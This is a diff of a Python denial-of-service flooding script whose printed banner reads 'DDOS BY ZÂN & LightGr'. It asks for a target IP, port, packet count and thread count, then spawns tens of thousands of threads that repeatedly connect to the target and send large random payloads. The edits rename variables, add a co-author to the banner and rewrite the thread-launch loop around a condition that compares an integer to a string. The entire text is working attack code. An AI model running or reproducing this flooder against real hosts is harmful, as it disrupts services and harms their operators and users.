@@ -141,7 +141,7 @@ ip = str(input("[ ! ] IP >>= "))
 ip = socket.gethostbyname(ip)
 port = int(input("[ ? ] PORT >>= "))
 pack = int(input("[ ? ] PACKET/S >>= "))
-thread = int(input("[ ? ] THREAD/T >>= "))
+th = int(input("[ ? ] THREAD/T >>= "))
 def start():
   global useragents, socks3
   hh = random._urandom(5000)
@@ -159,10 +159,11 @@ def start():
             for vr in range(pack):
              s.connect((ip,port))
              s.send((main_req))
-             print("[!] DDOS BY ZÂN [!]")
+             print("[!] DDOS BY ZÂN & LightGr [!]")
         except:
           s.close()
           print('[+] server error')
+          
   def tcp():
     global useragents, socks3
     data = random._urandom(7000)
@@ -182,14 +183,16 @@ def start():
              for i in range(pack):
                s.connect((str(ip),int(port)))
                s.send(str.encode(main_req))
-               print("[!] DDOS BY ZÂN [!]")
+               print("[!] DDOS BY ZAN & LightGr [!]")
           except:
              s.close()
              print('[+] server error')
+             
     for kntl in range(th):
-      thred = threading.Thread(target=start)
-      thred.start()
-    else:
-      for kntl in range(76000):
-       thred2  = threading.Thread(target=tcp)
-       thred2.start()
+      if kntl == 'bego':
+       thread = threading.Thread(target=start)
+       thread.start()
+      else:
+       for kntl in range(76000):
+        thread2  = threading.Thread(target=tcp)
+        thread2.start()
